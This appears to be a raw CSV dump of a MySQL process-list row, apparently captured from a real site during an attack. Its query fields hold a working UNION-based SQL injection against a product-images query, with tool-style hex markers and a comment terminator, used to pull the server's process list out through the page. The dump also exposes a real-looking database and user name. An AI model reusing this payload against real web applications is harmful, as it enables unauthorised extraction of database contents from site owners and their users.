ID,TID,QUERY_ID,DB,INFO,STAGE,STATE,HOST,TIME,USER,COMMAND,TIME_MS,PROGRESS,MAX_STAGE,INFO_BINARY,MEMORY_USED,EXAMINED_ROWS,MAX_MEMORY_USED
696380033,2605458,77955876181,u410070197_alvaro,"SELECT id,CONCAT('Admin/',pim.images) AS images\r\n\t\t\t\t\t\t\t\t\tFROM product_images pim\r\n\t\t\t\t\t\t\t\t\tWHERE pim.product_id = 16 UNION ALL SELECT NULL,CONCAT(0x7162626a71,JSON_ARRAYAGG(CONCAT_WS(0x6f69766a6276,IFNULL(CAST(COMMAND AS CHAR),0x20),IFNULL(CAST(DB AS CHAR),0x20),IFNULL(CAST(EXAMINED_ROWS AS CHAR),0x20),IFNULL(CAST(ID AS CHAR),0x20),IFNULL(CAST(INFO AS CHAR),0x20),IFNULL(CAST(INFO_BINARY AS CHAR),0x20),IFNULL(CAST(MAX_MEMORY_USED AS CHAR),0x20),IFNULL(CAST(MAX_STAGE AS CHAR),0x20),IFNULL(CAST(MEMORY_USED AS CHAR),0x20),IFNULL(CAST(PROGRESS AS CHAR),0x20),IFNULL(CAST(QUERY_ID AS CHAR),0x20),IFNULL(CAST(STAGE AS CHAR),0x20),IFNULL(CAST(STATE AS CHAR),0x20),IFNULL(CAST(TID AS CHAR),0x20),IFNULL(CAST(TIME_MS AS CHAR),0x20),IFNULL(CAST(`HOST` AS CHAR),0x20),IFNULL(CAST(`TIME` AS CHAR),0x20),IFNULL(CAST(`USER` AS CHAR),0x20))),0x71787a7671) FROM information_schema.`PROCESSLIST`-- -",0,Filling schema table,localhost,0,u410070197_alvaro_db,Query,1.181,0.000,0,"SELECT id,CONCAT('Admin/',pim.images) AS images\r\n\t\t\t\t\t\t\t\t\tFROM product_images pim\r\n\t\t\t\t\t\t\t\t\tWHERE pim.product_id = 16 UNION ALL SELECT NULL,CONCAT(0x7162626a71,JSON_ARRAYAGG(CONCAT_WS(0x6f69766a6276,IFNULL(CAST(COMMAND AS CHAR),0x20),IFNULL(CAST(DB AS CHAR),0x20),IFNULL(CAST(EXAMINED_ROWS AS CHAR),0x20),IFNULL(CAST(ID AS CHAR),0x20),IFNULL(CAST(INFO AS CHAR),0x20),IFNULL(CAST(INFO_BINARY AS CHAR),0x20),IFNULL(CAST(MAX_MEMORY_USED AS CHAR),0x20),IFNULL(CAST(MAX_STAGE AS CHAR),0x20),IFNULL(CAST(MEMORY_USED AS CHAR),0x20),IFNULL(CAST(PROGRESS AS CHAR),0x20),IFNULL(CAST(QUERY_ID AS CHAR),0x20),IFNULL(CAST(STAGE AS CHAR),0x20),IFNULL(CAST(STATE AS CHAR),0x20),IFNULL(CAST(TID AS CHAR),0x20),IFNULL(CAST(TIME_MS AS CHAR),0x20),IFNULL(CAST(`HOST` AS CHAR),0x20),IFNULL(CAST(`TIME` AS CHAR),0x20),IFNULL(CAST(`USER` AS CHAR),0x20))),0x71787a7671) FROM information_schema.`PROCESSLIST`-- -",232912,0,4380488

